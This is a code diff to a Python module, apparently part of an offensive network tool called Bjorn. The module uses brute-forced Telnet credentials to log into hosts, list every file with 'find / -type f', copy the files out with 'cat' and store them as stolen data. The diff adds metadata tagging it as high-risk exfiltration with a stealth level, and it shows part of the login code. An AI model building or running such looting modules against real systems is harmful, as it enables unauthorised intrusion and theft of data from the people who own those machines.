@@ -1,12 +1,4 @@
-"""
-steal_files_telnet.py — Telnet file looter (DB-backed)
-
-SQL mode:
-- Orchestrator provides (ip, port) after parent success (TelnetBruteforce).
-- Credentials read from DB.creds (service='telnet'); we try each pair.
-- Files found via 'find / -type f', then retrieved with 'cat'.
-- Output under: {data_stolen_dir}/telnet/{mac}_{ip}/...
-"""
+"""steal_files_telnet.py - Loot files over Telnet using cracked credentials."""
 
 import os
 import telnetlib
@@ -25,6 +17,24 @@ b_module = "steal_files_telnet"
 b_status = "steal_files_telnet"
 b_parent = "TelnetBruteforce"
 b_port   = 23
+b_enabled = 1
+b_action = "normal"
+b_service = '["telnet"]'
+b_trigger = 'on_any:["on_cred_found:telnet","on_service:telnet"]'
+b_requires = '{"all":[{"has_cred":"telnet"},{"has_port":23}]}'
+b_priority = 60
+b_cooldown = 3600
+b_timeout = 600
+b_stealth_level = 5
+b_risk_level = "high"
+b_max_retries = 1
+b_tags = ["exfil", "telnet", "loot", "files"]
+b_category = "exfiltration"
+b_name = "Steal Files Telnet"
+b_description = "Loot files over Telnet using cracked credentials."
+b_author = "Bjorn Team"
+b_version = "2.0.0"
+b_icon = "StealFilesTelnet.png"
 
 
 class StealFilesTelnet:
@@ -110,7 +120,7 @@ class StealFilesTelnet:
             if password:
                 tn.read_until(b"Password: ", timeout=5)
                 tn.write(password.encode('ascii') + b"\n")
-            # prompt detection (naïf mais identique à l'original)
+            # Naive prompt detection (matches original behavior)
             time.sleep(2)
             self.telnet_connected = True
             logger.info(f"Connected to {ip} via Telnet as {username}")
@@ -159,7 +169,9 @@ class StealFilesTelnet:
     # -------- Orchestrator entry --------
     def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
         try:
-            self.shared_data.bjorn_orch_status = b_class
+            self.shared_data.bjorn_orch_status = "StealFilesTelnet"
+            # EPD live status
+            self.shared_data.comment_params = {"ip": ip, "port": str(port), "files": "0"}
             try:
                 port_i = int(port)
             except Exception:
@@ -216,3 +228,6 @@ class StealFilesTelnet:
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
+        finally:
+            self.shared_data.bjorn_progress = ""
+            self.shared_data.comment_params = {}
